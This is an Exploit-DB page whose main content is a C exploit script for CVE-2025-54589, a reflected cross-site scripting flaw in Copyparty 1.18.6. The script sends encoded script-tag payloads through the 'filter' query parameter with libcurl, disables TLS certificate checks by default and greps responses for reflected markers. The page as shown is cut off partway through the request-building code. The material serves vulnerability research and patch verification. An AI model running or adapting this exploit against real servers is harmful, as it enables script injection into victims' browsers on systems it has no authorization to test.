---
title: [webapps] Copyparty 1.18.6 - Reflected Cross-Site Scripting (XSS)
url: https://www.exploit-db.com/exploits/52390
source: Exploit-DB.com RSS Feed
date: 2025-08-04
fetch_date: 2025-10-07T00:15:06.283850
---

# [webapps] Copyparty 1.18.6 - Reflected Cross-Site Scripting (XSS)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Copyparty 1.18.6 - Reflected Cross-Site Scripting (XSS)

#### EDB-ID:

###### 52390

#### CVE:

###### [2025-54589](https://nvd.nist.gov/vuln/detail/CVE-2025-54589)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-03

---

**Vulnerable App:**

```
/*
 * Author       : Byte Reaper
 * CVE          : CVE-2025-54589
 * Title : Copyparty 1.18.6 - Reflected Cross-Site Scripting (XSS)
 * CVE-2025-54589 is a reflected cross-site scripting (XSS) vulnerability in Copyparty (≤ 1.18.6) where the filter parameter is inserted into the HTML response without proper sanitization,
  allowing an attacker to inject and execute arbitrary JavaScript in a victim’s browser
*/

#include <curl/urlapi.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include "argparse.h"
#include <stdlib.h>
#include <arpa/inet.h>
#include <stdarg.h>
#include <unistd.h>

#define FULL_URL 2500
#define COLOR_RESET "\e[0m"
#define COLOR_RED   "\e[1;31m"
#define COLOR_GRN   "\e[1;32m"
#define COLOR_YEL   "\e[1;33m"
#define COLOR_BLU   "\e[1;34m"
#define COLOR_CYN   "\e[1;36m"
#define COLOR_WHT   "\e[1;37m"
#define COLOR_PUR   "\e[1;35m"
#define PRINT_OK(fmt, ...)    print_color(COLOR_GRN, "" fmt, ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...)   print_color(COLOR_RED, "" fmt, ##__VA_ARGS__)
#define PRINT_WARN(fmt, ...)  print_color(COLOR_YEL, "" fmt, ##__VA_ARGS__)
#define PRINT_INFO(fmt, ...)  print_color(COLOR_BLU, "" fmt, ##__VA_ARGS__)
#define PRINT_NOTE(fmt, ...)  print_color(COLOR_CYN, "" fmt, ##__VA_ARGS__)

int verbose = 0;
int useC = 0;
const char *ipT = NULL;
int  portT = 0;
const char *cookies = NULL;
const char *caFile = NULL;
int sCa = 0;
int useColor = 1;
int useHttp = 0;
void print_color(const char *color, const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    if (useColor)
    {
        printf("%s", color);
    }

    vprintf(fmt, args);
    if (useColor)
    {
        printf("%s", COLOR_RESET);
    }

    va_end(args);
}
void exitAssembly()
{
    __asm__ volatile
    (
        "xor %%rdi, %%rdi\n\t"
        "mov $231, %%rax\n\t"
        "syscall\n\t"
        :
        :
        : "rax",
          "rdi"
    );
}
struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        PRINT_ERR("[-] Failed to allocate memory!\n");
        exitAssembly();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
const char *payloadXss[] =
{

    "</script><script>alert(1)</script>",
    "<script\x09type=\"text/javascript\">javascript:alert(XSS);</script>",
    "<script\x0Ctype=\"text/javascript\">javascript:alert(byte);</script>"
};
int number = sizeof(payloadXss) / sizeof(payloadXss[0]);
const char *wordF[] =
{
    "Error",
    "Exception",
    "Invalid",
    "XSS",
    "<script>",
    "</script>",
    "alert(1)",
    "syntax",
    "unexpected",
    "undefined",
    "NaN",
    "stack trace",
    "TypeError",
    "ReferenceError",
    "Warning",
    "Access denied",
    "eval(",
    "byte",
};
int numberW = sizeof(wordF) / sizeof(wordF[0]);

void auto_detect_color()
{
    if (!isatty(fileno(stdout)))
    {
        useColor = 0;
    }
}
void senR(const char *ip, int port)
{
    char full[FULL_URL];
    CURLcode res ;
    CURL *curl = curl_easy_init();
    struct  Mem response ;
    response.buffer= NULL;
    response.len = 0;
    for (int h = 0; h < number ; h++)
    {
        if (!curl)
        {
            PRINT_ERR("[-] Error Create Object Curl !\n");
            PRINT_ERR("[-] Check Your Connection\n");
            exitAssembly();

        }
        if (verbose)
        {
            PRINT_OK("==========================================\n");
            PRINT_OK("[1;33m[+] Cleaning Response...\n");
            PRINT_OK("[1;33m[+] Response Buffer : NULL\n");
            PRINT_OK("[1;33m[+] Response Len : 0\n");
            PRINT_OK("==========================================\n");
        }
        if (curl)
        {

            char *payloadE = curl_easy_escape(curl,
                payloadXss[h],
                0);
            struct curl_slist *headers = NULL;
            if (!payloadE)
            {
                PRINT_ERR("[-] Error Encode Payload !\e[0m\n");
                curl_slist_free_all(headers);
                curl_easy_cleanup(curl);
                exitAssembly();
            }

            const char *proto = useHttp ? "http" : "https";
            int len1 = snprintf(full, sizeof(full), "%s://%s:%d/?filter=%s", proto, ip, port, payloadE);
            if (len1 >= sizeof(full))
            {
                PRINT_ERR("[-] URL too long\n");
                exitAssembly();
            }
            PRINT_INFO("[+] Encode Payload : %s\n", payloadXss[h]);
            PRINT_INFO("[+] Encode Payload Successfully.\n");
            PRINT_INFO("[+] Payload Encode : %s\n", payloadE);
            PRINT_INFO("[+] target IP : %s\n",
                ip);
            printf("[+] Full Url : %s\n",
                full);
            printf("[+] Port : %d\n", port);
            curl_easy_setopt(curl,
                CURLOPT_URL,
                full);
            curl_free(payloadE);
            if (useC)
            {
                curl_easy_setopt(curl,
                                 CURLOPT_COOKIEFILE,
                                    cookies);
                curl_easy_setopt(curl,
                                 CURLOPT_COOKIEJAR,
                                 cookies);
            }
            curl_easy_setopt(curl,
                CURLOPT_FOLLOWLOCATION,
                1L);
            curl_easy_setopt(curl,
                            CURLOPT_WRITEFUNCTION,
                            write_cb);
            curl_easy_setopt(curl,
                            CURLOPT_WRITEDATA,
                                &response);
            curl_easy_setopt(curl,
                            CURLOPT_CONNECTTIMEOUT,
                            5L);
            usleep(1500000);
            curl_easy_setopt(curl,
                        CURLOPT_TIMEOUT,
                                10L);
            if (sCa)
            {
                curl_easy_setopt(curl, CURLOPT_CAINFO, caFile);
            }
            else
            {
                curl_easy_setopt(curl,
                    CURLOPT_SSL_VERIFYPEER,
                    0L);
                curl_easy_setopt(curl,
                                CURLOPT_SSL_VERIFYHOST,
                                0L);
            }

            headers = curl_slist_append(headers,
                                    "Accept-Language: en-US,en");
            headers = curl_slist_append(headers,
                                        "Connection: keep-alive");
            char refR[120];
            int lenF  = snprintf(refR,
                sizeof(refR),
                "Referer: http://%s:%d",
                ip,
                port);
            if (lenF < 0 || (size_t)lenF >= sizeof(refR))
            {
                PRINT_ERR("[-] Len Header Referer ...